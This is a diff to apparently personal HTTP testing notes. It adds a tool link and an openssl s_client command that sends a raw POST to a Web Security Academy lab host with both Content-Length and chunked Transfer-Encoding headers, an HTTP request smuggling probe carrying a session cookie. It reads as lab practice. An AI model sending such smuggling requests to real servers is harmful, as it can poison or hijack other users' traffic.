@@ -419,8 +419,8 @@ User Authentication against Active Directory, Dissecting EAP-TLS
 ```bash
 # Validate server push requests
 nghttp -v -ans https://foo/index.html
-# ||
-# chrome://net-export
+# || https://github.com/fstab/h2c
+# || chrome://net-export
 ```
 
 # methods
@@ -532,4 +532,12 @@ curl http://foo --data-urlencode 'a=foo bar'
 
 ```python
 urllib.unquote(c)
+```
+
+# dump
+
+```bash
+echo -n "POST / HTTP/1.1\r\nHost: ac281f2f1e11201c8009578100490024.web-security-academy.net\r\nCookie: session=Q5yRgVdBGWyLtH2VIG1pvMTHgvWo82FM\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nA" | openssl s_client -debug -ign_eof -connect ac281f2f1e11201c8009578100490024.web-security-academy.net:443
+# With SSL decrypted: Add `-cypher NULL`
+# - :( server may reject request
 ```
